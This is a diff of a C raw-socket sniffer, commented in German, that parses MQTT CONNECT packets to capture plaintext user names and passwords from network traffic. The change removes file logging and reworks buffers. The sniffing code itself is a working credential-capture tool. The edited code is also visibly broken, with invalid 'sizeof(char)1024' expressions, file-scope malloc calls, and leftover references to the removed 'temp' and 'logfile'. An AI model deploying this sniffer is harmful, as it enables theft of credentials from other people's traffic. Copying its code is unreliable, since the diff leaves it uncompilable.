@@ -18,15 +18,14 @@ int filter_password(unsigned char* , int,int,int);
 int get_field(unsigned char*, char**, int);
  
 int sock_raw; // erstelle unseren socket den Wir brauchen
-FILE *logfile; // logfile für ausgaben
 unsigned char buffer[65536];
 
 int password_found = 0; // boolean ob wir ein passendes Passwort gefunden haben
 
 int tcp=0,others=0,total=0,i,j;
 
-char* user_name; //Saved Username
-char* password;  //Saved Password
+char* user_name = malloc(sizeof(char)1024); //Saved Username
+char* password = malloc(sizeof(char)1024);  //Saved Password
 
 struct sockaddr_in source,dest; //erstelle Sockadress
  
@@ -35,10 +34,7 @@ int main(int argc, char **argv){
     struct sockaddr saddr;
     struct in_addr in;
  
-    logfile=fopen("log.txt","w");
-    if(logfile==NULL) printf("Unable to create file.");
     printf("Starting...\n");
-    fprintf(logfile,"\n\n***********************Log File*************************\n");   
     //Create a raw socket that shall sniff
     sock_raw = socket(AF_INET , SOCK_RAW , IPPROTO_TCP);
     if(sock_raw < 0)
@@ -48,7 +44,6 @@ int main(int argc, char **argv){
     }
     while(!password_found)
     {
-        printf("Struck in Loop\n");
         saddr_size = sizeof saddr;
         //Receive a packet
         data_size = 0;
@@ -64,7 +59,6 @@ int main(int argc, char **argv){
     }
  
     close(sock_raw);
-    fclose(logfile); 
      
     printf("Finished\n");
     return 0;
@@ -145,14 +139,9 @@ int filter_remaining_length(unsigned char* data_payload, int Size)
     }
     //Ende des abgewandten Codes
  
-    fprintf(logfile,"\n\n***********************Connect Packet*************************\n");    
-    fprintf(logfile,"Remaining Length: %d\n",remaining_length);  
- 
     //Okay wir stehen nun auf dem Protocol Name
     filter_protocol_name(data_payload, Size, remaining_length, pos);
- 
-    fprintf(logfile,"\n###########################################################"); 
- 
+  
      return 0;
 }
 
@@ -161,27 +150,19 @@ int filter_remaining_length(unsigned char* data_payload, int Size)
 * In field wird der Inhalt des Fields koopiert, und endet mit \0
 * field muss dabei später gefreed werden
 */
-int get_field(unsigned char* data_payload, char** field, int pos){ 
+int get_field(unsigned char* data_payload, char* field, int pos){ 
  pos++; // skip MSB
  int length_field = data_payload[pos];
- //fprintf(logfile,"LSB: %d\n",length_field);
  pos++;
- 
- // Erstelle zwischen Speicher mit platz für \0
- char* temp = malloc(sizeof(char)*length_field+1);
  
  int i;
  //laufe das arraydurch
  for(i=0;i<length_field;i++){
-  temp[i] = data_payload[pos];
-  fprintf(logfile,"%c",temp[i]);
+  field[i] = data_payload[pos];
   pos++;
  }
  //setze ende des Strings
  temp[length_field] = '\0';
- 
- //stelle verknüpfung her
- *field = temp;
  
  //Gebe neue position zurück
  return pos;
@@ -192,7 +173,6 @@ int get_field(unsigned char* data_payload, char** field, int pos){
 * Finde den Protokollnamen heraus und fahre dann fort wenn dieser passt
 */
 int filter_protocol_name(unsigned char* data_payload, int Size, int remaining_length, int pos ){
- fprintf(logfile,"Protocol Name: ");  
  char* protocol_name;
  //Lese Protocolname field aus
  pos = get_field(data_payload,&protocol_name,pos);  
@@ -232,14 +212,11 @@ unsigned int int_to_int(unsigned int k) {
 */
 int filter_connect_flags(unsigned char* data_payload, int Size, int remaining_length, int pos ){
  //pos stands now on connect flags
- fprintf(logfile,"Connect Flags: %d\n",int_to_int(data_payload[pos]));
  
  //Setzte ob wir unsere Flags gefunden habenm je nachdem wo die Bits stehen
  int is_user_name_flag = (data_payload[pos] & 0x80)==128;
  int is_password_flag = (data_payload[pos] & 0x40)==64;
  
- fprintf(logfile,"-- User Name Flag: %d\n",is_user_name_flag);
- fprintf(logfile,"-- Password Flag: %d\n",is_password_flag);
  pos++; // forward to keep alive
  
  pos++; //skip keep alive MSB
@@ -285,10 +262,7 @@ int filter_connect_flags(unsigned char* data_payload, int Size, int remaining_le
 * Unnötiger Client Identifier, steht uns nunmal im weg
 */
 int filter_client_identifier(unsigned char* data_payload, int Size, int remaining_length, int pos ){
-  
- //fprintf(logfile,"Client Identifier MSB : %d\n",data_payload[pos]);  
- fprintf(logfile,"Client Identifier: ");  
- char* identifier;
+ char* identifier = malloc(sizeof(char)1024);
  pos = get_field(data_payload,&identifier,pos);
   
  fprintf(logfile,"\n");  
@@ -302,27 +276,14 @@ int filter_client_identifier(unsigned char* data_payload, int Size, int remainin
 * So hier gehts an die Wurst, wir müssen nun den Username auslesen
 */
 int filter_user_name(unsigned char* data_payload, int Size, int remaining_length, int pos ){
-  
-  //fprintf(logfile,"User Name MSB : %d\n",data_payload[pos]);  
-  fprintf(logfile,"User Name: ");  
-  
-  //Fülle das field User_name
   pos = get_field(data_payload,&user_name,pos);
-  
-  fprintf(logfile,"\n");  
- return pos;
+   return pos;
 }
 
 /**
 * Safe das Passwort als Plaintext zu senden, wir freuen uns
 */
 int filter_password(unsigned char* data_payload, int Size, int remaining_length, int pos ){
- //fprintf(logfile,"Password MSB : %d\n",data_payload[pos]); 
- fprintf(logfile,"Password: ");  
-  
-   //Fülle das field Password
   pos = get_field(data_payload,&password,pos);
-  
-  fprintf(logfile,"\n");  
  return pos;
 }
